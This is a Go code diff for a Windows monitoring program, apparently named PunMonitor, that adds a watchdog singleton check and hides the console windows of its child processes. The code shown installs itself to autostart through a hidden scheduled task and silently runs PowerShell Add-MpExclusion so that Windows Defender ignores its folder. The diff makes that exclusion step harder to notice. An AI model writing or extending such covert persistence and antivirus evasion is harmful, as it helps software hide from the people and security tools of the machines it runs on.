@@ -42,6 +42,22 @@ func watchdogSingleton() bool {
 	return h != 0
 }
 
+// monitorAlreadyRunning checks if a main PunMonitor process is already running by
+// attempting to grab the singleton mutex. If the mutex already exists (whether
+// via GetLastError or via the returned error), another instance is running.
+// Used by the watchdog to avoid restart loops.
+func monitorAlreadyRunning() bool {
+	h, err := windows.CreateMutex(nil, false, windows.StringToUTF16Ptr(`Global\PunMonitorSingleton`))
+	if h != 0 {
+		defer windows.CloseHandle(h)
+	}
+	// CreateMutex returns ERROR_ALREADY_EXISTS as an error when the mutex exists.
+	if err == windows.ERROR_ALREADY_EXISTS || err == syscall.Errno(0xB7) {
+		return true
+	}
+	return false
+}
+
 func singleton() bool {
 	h, err := windows.CreateMutex(nil, false, windows.StringToUTF16Ptr(`Global\PunMonitorSingleton`))
 	if err != nil {
@@ -64,7 +80,9 @@ func systemBootTimeMS() int64 {
 		return time.Now().Add(-time.Duration(r) * time.Millisecond).UnixMilli()
 	}
 	// Fallback: WMI query via command
-	out, err := exec.Command("cmd", "/c", "wmic", "os", "get", "lastbootuptime").Output()
+	wmicCmd := exec.Command("wmic", "os", "get", "lastbootuptime")
+	newHiddenCmd(wmicCmd)
+	out, err := wmicCmd.Output()
 	if err == nil {
 		t := strings.TrimSpace(string(out))
 		lines := strings.Split(t, "\n")
@@ -215,7 +233,7 @@ func setupAutostart() {
 		watchdogExe,
 	)
 	cmd := exec.Command("cmd", "/c", schtasksCmd)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+	newHiddenCmd(cmd)
 	cmd.Run()
 	llog("info", "Autostart installed: %s (+ scheduled task)", path)
 }
@@ -240,8 +258,8 @@ func addDefenderExclusion() {
 	
 	// Try PowerShell command to add exclusion (requires admin)
 	psCmd := fmt.Sprintf(`Add-MpExclusion -Path '%s' -ErrorAction SilentlyContinue`, exeDir)
-	cmd := exec.Command("powershell", "-Command", psCmd)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psCmd)
+	newHiddenCmd(cmd)
 	if err := cmd.Run(); err == nil {
 		llog("info", "Defender exclusion added for %s", exeDir)
 		return
